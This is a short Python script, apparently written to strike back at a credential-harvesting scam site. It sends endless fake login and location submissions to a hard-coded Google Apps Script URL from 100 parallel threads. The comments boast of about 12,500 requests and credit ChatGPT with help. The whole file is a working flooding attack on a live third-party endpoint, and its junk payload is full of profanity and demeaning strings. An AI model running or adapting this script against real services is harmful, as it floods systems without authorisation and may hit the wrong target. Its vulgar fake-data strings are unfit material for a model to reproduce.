#use pip to download (or pycharm config)
import requests
import threading

#actual address is niblings.vercel.app (i hope its down now, if its not dont go there lul)
url = 'https://script.google.com/macros/s/AKfycbzllJRl0OcyfnwZIYCoscUPmEpWtnXDdwBBkF48CyvQmaxs_MM872VCqooK86XUC-Cw/exec'

#Send in the data
def generate_fake_data():
    return {
        'USER': "gaylord9000",
        'PASS': "fuck you cunt",
        'CATEGORY': "lesbians",
        'CONTINENT': "africa",
        'COUNTRY': "india",
        'CAPITAL': "new jersey",
        'STATE': "depression",
        'CITY': "bakersfield",
        'CURRENCY': "fucking dogecoin idk",
        'PHONE_CODE': "69",
        'IP_ADDRESS': "https://www.reddit.com/r/197/comments/194sc3w/this_was_commission_for_50k_by_verbalase/"


    }

#sends in the data
def send_fake_data(url, data):
    try:
        response = requests.post(url, data=data)
        print(f'Status Code: {response.status_code}, Response: {response.text}')

    except Exception as e:
        print(f'An error occurred: {e}')


#infinite loop to fuck em up
def fuckemup():
    while True:
        fake_data = generate_fake_data()
        send_fake_data(url, fake_data)
        print("lmao get fucked kiddo")



#threading to go faster
threads = []

#loop goes into threads, i let this run for about an hour thirty, about 12,500 requests of fake data sent 
for i in range(100):
    t = threading.Thread(target=fuckemup)
    t.daemon = True
    threads.append(t)

for i in range (100):
    threads[i].start()

for i in range (100):
    threads[i].join()

#code in collaboration with chatgpt lol
#inspired by an engineering man vid
